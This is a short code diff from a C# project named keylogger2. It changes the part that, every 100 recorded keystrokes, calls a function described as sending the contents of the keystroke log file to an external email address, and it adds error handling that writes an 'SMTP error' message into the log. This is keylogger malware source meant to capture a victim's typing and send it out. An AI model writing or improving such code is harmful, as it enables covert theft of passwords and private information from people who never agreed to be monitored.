@@ -51,19 +51,21 @@ namespace keylogger2
 
         if (numberofKeystrokes % 100 == 0 )
         {
+       try {
         SendNewMessage();
-        }
-
-
-
+    }catch(Exception ex){
+   using (StreamWriter sw = File.AppendText(path)) {
+     sw.Write(" |||Im sorry system shutdown due to SMTP error||| ");
+                            }
+                         }
+                     }
+                }
             }
         }
-    }
-    //now we setup the function that sends the contents of the file to an email address.
-    }         
+    }//main end         
     
     
-
+//now we setup the function that sends the contents of the file to an email address.
 static void SendNewMessage()
 {
 // send the contents of the txt file to an external email address 
